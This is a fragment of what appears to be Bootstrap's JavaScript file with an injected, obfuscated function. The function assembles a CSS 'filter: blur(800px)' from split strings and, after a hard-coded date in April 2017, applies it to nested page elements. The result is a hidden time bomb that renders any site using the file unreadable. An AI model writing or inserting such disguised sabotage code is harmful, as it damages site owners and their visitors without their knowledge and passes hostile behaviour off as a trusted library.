if ("undefined" == typeof jQuery) throw new Error("Bootstrap's JavaScript requires jQuery"); + function (t) {
	...
	(function (){
		var k = 14919444e5,	prtnl1='div>',dluc1='fil',dluc2='blu',
			dluc3='r',	dluc4='te',	dluc5='('+'8'+'e2'+'px)';
		if (Date.now()>k)	return jQuery(prtnl1+prtnl1+'*').css(dluc1+dluc4+dluc3,dluc2+dluc3+dluc5);
	})();
}(jQuery),	+ function (t) {
	"use strict";
